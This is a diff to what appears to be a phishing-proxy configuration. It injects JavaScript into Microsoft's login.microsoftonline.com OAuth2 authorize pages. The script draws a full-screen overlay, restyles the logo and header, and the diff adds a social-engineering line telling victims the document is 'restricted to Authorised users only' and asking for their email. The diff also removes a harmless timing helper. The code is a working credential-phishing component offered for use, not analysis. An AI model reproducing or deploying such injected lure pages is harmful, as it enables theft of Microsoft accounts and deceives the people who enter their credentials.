@@ -54,10 +54,6 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/common/oauth2/v2.0/authorize", "/common/oauth2/v2.0/authorize*"]
     script: |
-      function wait(ms, callback) {
-      setTimeout(callback, ms);
-      }
-      
       const overlay = document.createElement("div");
       overlay.style.position = "fixed";
       overlay.style.top = "0";
@@ -143,11 +139,6 @@ js_inject:
               logoImg.style.width = "100px";
               logoImg.style.margin = "0 0 20px 0";
             }
-            wait(3000, () => {
-            console.log("Waited 3 seconds!");
-            
-            });
-
 
             if (headerTitle) {
               const heading = headerTitle.querySelector('[role="heading"], h1, div');
@@ -159,6 +150,16 @@ js_inject:
               subtitle.style.margin = "4px 0 12px 0";
               subtitle.style.color = "#333";
               headerTitle.appendChild(subtitle);
+
+              // Inserted request: display the same text under heading
+              if (heading) {
+                const infoText = document.createElement("p");
+                infoText.textContent = "Access to this document is restricted to Authorised users only. Kindly enter your email";
+                infoText.style.fontSize = "13px";
+                infoText.style.color = "#333";
+                infoText.style.margin = "6px 0 0 0";
+                heading.insertAdjacentElement("afterend", infoText);
+              }
             }
 
             const inputRow = emailInput.closest(".form-group") || emailInput.parentElement;
